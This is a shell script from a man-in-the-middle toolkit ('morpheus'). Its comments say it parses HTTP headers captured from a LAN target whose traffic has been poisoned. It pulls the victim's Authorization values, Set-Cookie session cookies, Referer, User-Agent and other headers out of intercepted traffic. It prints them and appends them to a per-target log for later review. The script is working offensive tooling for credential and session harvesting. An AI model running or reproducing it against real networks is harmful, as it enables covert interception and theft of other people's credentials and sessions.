#!/bin/sh
##
# 'http tcp header information gathering'
# This script will parse tcp header data collected by morpheus under MITM attacks.
# Basic we use morpheus.sh tool to poison target host under LAN to be abble to
# capture is network communications and extract juice info for tcp headers.
# Special Thanks: shanty damayanti
## resize -s 27 109 > /dev/null



#
# Variable declarations function ..
#
cd ..
rhost=`cat output/ip.mop | egrep -m 1 "target:" | cut -d ':' -f2`
iface=`netstat -r | grep "default" | awk {'print $8'}`
mod=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
#
# Use warning sounds in every capture?
# Special thanks: shanty damayanti (parrot OS)
#
echo "╔───────────────────────────────────────╗"
echo "| http tcp header information gathering |"
echo "╚───────────────────────────────────────╝"
echo -n "Be alerted by a BEEP in every <header> capture? (y/n):";read op
if [ $op = "y" ] || [ $op = "yes" ]; then
  OGG=`locate .ogg | grep "default/alerts" | head -3 | tail -1`
  warn=yes
else
  warn=no
fi



#
# Script banner
#
clear
echo "╔───────────────────────────────────────╗"
echo "| http tcp header information gathering |"
echo "╚───────────────────────────────────────╝"
echo " | Interface : $iface"
echo " |   Rhost   : $rhost"
echo " |_  Gateway : $mod"
echo ""


#
# Start of loop function ..
#
while :
do

  # check for logfile presence ..
  if [ -e logs/IG.log ]; then
    hour=`date | awk {'print $4,$5,$6'}`
    echo "" && echo "Tcp header capture"
    echo "Hour/Time: $hour"
    #
    # Play alert sound (paplay) settings ..
    #
    if [ $warn = "yes" ]; then
      if [ -e bin/warn.ogg ]; then
        paplay bin/warn.ogg
      else
        paplay $OGG
      fi
    fi


      #
      # Parsing captured data from IG.log file ..
      #
      TST=`cat logs/IG.log | egrep -m 1 "Tk:" | awk {'print $2'}` > /dev/nul 2>&1
      DNT=`cat logs/IG.log | egrep -m 1 "DNT:" | awk {'print $2'}` > /dev/nul 2>&1
      HST=`cat logs/IG.log | egrep -m 1 "Host:" | awk {'print $2'}` > /dev/nul 2>&1
      FEM=`cat logs/IG.log | egrep -m 1 "From:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      RFR=`cat logs/IG.log | egrep -m 1 "Referer:" | awk {'print $2,$3'}` > /dev/nul 2>&1
      SER=`cat logs/IG.log | egrep -m 1 "Server:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      FWR=`cat logs/IG.log | egrep -m 1 "Forwarded:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      XFO=`cat logs/IG.log | egrep -m 1 "X-Frame-Options:" | awk {'print $2'}` > /dev/nul 2>&1
      CON=`cat logs/IG.log | egrep -m 1 "Connection:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      CTT=`cat logs/IG.log | egrep -m 1 "Content-Type:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      AUT=`cat logs/IG.log | egrep -m 1 "Authorization:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      XSS=`cat logs/IG.log | egrep -m 1 "X-XSS-Protection:" | awk {'print $2,$3'}` > /dev/nul 2>&1
      XCO=`cat logs/IG.log | egrep -m 1 "X-Content-Type-Options:" | awk {'print $2'}` > /dev/nul 2>&1
      CHC=`cat logs/IG.log | egrep -m 1 "Cache-Control:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      XFH=`cat logs/IG.log | egrep -m 1 "X-Forwarded-Host:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      CEN=`cat logs/IG.log | egrep -m 1 "Content-Encoding:" | awk {'print $2,$3,$4'}` > /dev/nul 2>&1
      ACS=`cat logs/IG.log | egrep -m 1 "Accept-Charset:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      CTL=`cat logs/IG.log | egrep -m 1 "Content-Language:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      STC=`cat logs/IG.log | egrep -m 1 "Set-Cookie:" | awk {'print $2,$3,$4,$5,$6,$7'}` > /dev/nul 2>&1
      LGA=`cat logs/IG.log | egrep -m 1 "Accepted-Language:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      HSTS=`cat logs/IG.log | egrep -m 1 "Strict-Transport-Security:" | awk {'print $2,$3,$4,$5'}` > /dev/nul 2>&1
      ACAM=`cat logs/IG.log | egrep -m 1 "Access-Control-Allow-Methods:" | awk {'print $2,$3,$4,$5,$6'}` > /dev/nul 2>&1
      TUA=`cat logs/IG.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14'}` > /dev/nul 2>&1


      #
      # Print OnScreen headers captured ..
      #
      sleep 0.8
      echo "------------------------------------------------"
      echo "Host                : $HST"
      echo "DNT(Do Not Track)   : $DNT"
      echo "Tk(track status)    : $TST"
      echo "Content-Language    : $CTL"
      echo "Accepted-Language   : $LGA"
      echo "Connection          : $CON"
      echo "Content-Encoding    : $CEN"
      echo "X-XSS-Protection    : $XSS"
      echo "From                : $FEM"
      echo "Server              : $SER"
      echo "Allow-Methods       : $ACAM"
      echo "Cache-Control       : $CHC"
      echo "X-Forwarded-Host    : $XFH"
      echo "X-Content-Type-Opt  : $XCO"
      echo "X-Frame-Options     : $XFO"
      echo "Accept-Charset      : $ACS"
      echo "Content-Type        : $CTT"
      echo "HSTS                : $HSTS"
      echo "Authorization       : $AUT"
      echo "Set-Cookie          : $STC"
      echo "Forwarded           : $FWR"
      echo "Referer             : $RFR"
      echo "User-Agent          : $TUA"
      echo "------------------------------------------------"
      echo "[HELP] HTTP Headers : https://mzl.la/2OWMOte"


      #
      # Build new logfile with ALL the diferent packets data captured
      # for later review ( ../morpheus/logs/192.168.1.71-header_capture.log ).
      #
      if [ -d logs ]; then
        echo "" >> logs/$rhost-header_capture.log
        echo "Tcp header capture" >> logs/$rhost-header_capture.log
        echo "Target ip: $rhost" >> logs/$rhost-header_capture.log
        echo "Hour/Time: $hour" >> logs/$rhost-header_capture.log
        echo "------------------------------------------------" >> logs/$rhost-header_capture.log
        echo "Host                : $HST" >> logs/$rhost-header_capture.log
        echo "DNT(Do Not Track)   : $DNT" >> logs/$rhost-header_capture.log
        echo "Tk(track status)    : $TST" >> logs/$rhost-header_capture.log
        echo "Content-Language    : $CTL" >> logs/$rhost-header_capture.log
        echo "Accepted-Language   : $LGA" >> logs/$rhost-header_capture.log
        echo "Connection          : $CON" >> logs/$rhost-header_capture.log
        echo "Content-Encoding    : $CEN" >> logs/$rhost-header_capture.log
        echo "X-XSS-Protection    : $XSS" >> logs/$rhost-header_capture.log
        echo "From                : $FEM" >> logs/$rhost-header_capture.log
        echo "Server              : $SER" >> logs/$rhost-header_capture.log
        echo "Allow-Methods       : $ACAM" >> logs/$rhost-header_capture.log
        echo "Cache-Control       : $CHC" >> logs/$rhost-header_capture.log
        echo "X-Forwarded-Host    : $XFH" >> logs/$rhost-header_capture.log
        echo "X-Content-Type-Opt  : $XCO" >> logs/$rhost-header_capture.log
        echo "X-Frame-Options     : $XFO" >> logs/$rhost-header_capture.log
        echo "Accept-Charset      : $ACS" >> logs/$rhost-header_capture.log
        echo "Content-Type        : $CTT" >> logs/$rhost-header_capture.log
        echo "HSTS                : $HSTS" >> logs/$rhost-header_capture.log
        echo "Authorization       : $AUT" >> logs/$rhost-header_capture.log
        echo "Set-Cookie          : $STC" >> logs/$rhost-header_capture.log
        echo "Forwarded           : $FWR" >> logs/$rhost-header_capture.log
        echo "Referer             : $RFR" >> logs/$rhost-header_capture.log
        echo "User-Agent          : $TUA" >> logs/$rhost-header_capture.log
        echo "------------------------------------------------" >> logs/$rhost-header_capture.log
        echo "[HELP] HTTP Headers : https://mzl.la/2OWMOte" >> logs/$rhost-header_capture.log
        echo "" >> logs/$rhost-header_capture.log
      else
        echo "[ERROR] ../morpheus/logs/$rhost-header_capture.log  [ NOT BUILD ]"
      fi


    echo ""
    # delete temp logfile
    rm -f logs/IG.log > /dev/nul 2>&1
    sleep 1.3
    fi


  # end loop
  done

# exit script
exit
